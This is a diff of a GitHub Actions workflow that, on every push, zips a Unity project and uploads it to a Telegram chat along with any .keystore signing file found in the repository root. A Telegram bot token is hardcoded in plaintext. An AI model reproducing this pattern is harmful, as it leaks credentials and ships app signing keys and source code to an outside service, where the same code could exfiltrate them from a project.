@@ -5,6 +5,7 @@ on: push
 env:
   TG_CHAT_ID: "-1003810793512"
   TG_BOT_TOKEN: "8979603664:AAEiC0c56g5uNg-WVL7JcpGbw_8ysgV2y40"
+  APP_NAME: "com.spinreval.gamsmix"
 
 jobs:
   zip:
@@ -20,16 +21,16 @@ jobs:
       - name: Check files and Create ZIP
         run: |
           echo "=== Archiving Unity Folders ==="
-          # Создаем ОДИН общий ZIP-архив без деления. Флаг -q скроет огромный вывод файлов.
-          zip -rq unity_project.zip Assets Packages ProjectSettings UserSettings
+          zip -rq "${APP_NAME}.zip" Assets Packages ProjectSettings UserSettings
           
-          echo "ZIP size: $(wc -c < unity_project.zip) bytes"
+          echo "ZIP size: $(wc -c < "${APP_NAME}.zip") bytes"
           echo "================"
 
       - name: Send files to Telegram
         run: |
           python << 'EOF'
           import os
+          import glob
           import asyncio
           from telethon import TelegramClient
           from telethon.sessions import StringSession
@@ -39,9 +40,23 @@ jobs:
           bot_token = os.environ["TG_BOT_TOKEN"]
           chat_id = int(os.environ["TG_CHAT_ID"])
           workspace = os.environ["GITHUB_WORKSPACE"]
-
+          
+          app_name = os.environ["APP_NAME"].strip()
           app_info_path = os.path.join(workspace, "appinfo.txt")
-          zip_path = os.path.join(workspace, "unity_project.zip")
+          zip_path = os.path.join(workspace, f"{app_name}.zip")
+
+          # ---------------------------------------------------------------
+          # Поиск файла .keystore с любым именем в корне репозитория
+          # ---------------------------------------------------------------
+          keystore_pattern = os.path.join(workspace, "*.keystore")
+          keystore_files = glob.glob(keystore_pattern)
+
+          if not keystore_files:
+              print("WARNING: No .keystore file found in the workspace root!")
+              keystore_path = None
+          else:
+              keystore_path = keystore_files[0]
+              print(f"Found keystore: {os.path.basename(keystore_path)}")
 
           # Читаем текст для подписи
           with open(app_info_path, "r", encoding="utf-8") as f:
@@ -51,24 +66,31 @@ jobs:
           print(caption)
           print("==============================\n")
 
-          print("========== ZIP FILE ==========")
-          print(f"unity_project.zip: {os.path.getsize(zip_path)} bytes")
-          print("==============================\n")
-
           client = TelegramClient(StringSession(""), api_id, api_hash)
 
           async def main():
               await client.start(bot_token=bot_token)
 
-              print("Uploading single ZIP to Telegram...")
-              # Отправляем один единственный файл архива, caption станет подписью к нему
+              # Собираем список файлов для отправки в одном сообщении (альбоме)
+              # Загружаем сам ZIP-архив
+              files_to_send = [
+                  await client.upload_file(zip_path)
+              ]
+              
+              # Если кейстор найден, загружаем и его тоже
+              if keystore_path and os.path.exists(keystore_path):
+                  files_to_send.append(await client.upload_file(keystore_path))
+
+              print("Uploading ZIP and Keystore to Telegram...")
+              
+              # Отправляем файлы альбомом. Подпись привяжется к первому файлу (ZIP)
               await client.send_file(
                   chat_id,
-                  zip_path,
+                  files_to_send,
                   caption=caption
               )
 
-              print("ZIP uploaded successfully!")
+              print("All files uploaded successfully!")
               await client.disconnect()
 
           asyncio.run(main())
@@ -76,5 +98,6 @@ jobs:
         env:
           TG_API_ID: ${{ secrets.TG_API_ID }}
           TG_API_HASH: ${{ secrets.TG_API_HASH }}
-          TG_BOT_TOKEN: ${{ env.TG_BOT_TOKEN }}  # <- ИСПРАВЛЕНО: Теперь строго берет токен из блока env вверху файла
-          TG_CHAT_ID: ${{ env.TG_CHAT_ID }}      # <- ИСПРАВЛЕНО: Берет ID чата из env вверху файла
+          TG_BOT_TOKEN: ${{ env.TG_BOT_TOKEN }}
+          TG_CHAT_ID: ${{ env.TG_CHAT_ID }}
+          APP_NAME: ${{ env.APP_NAME }}
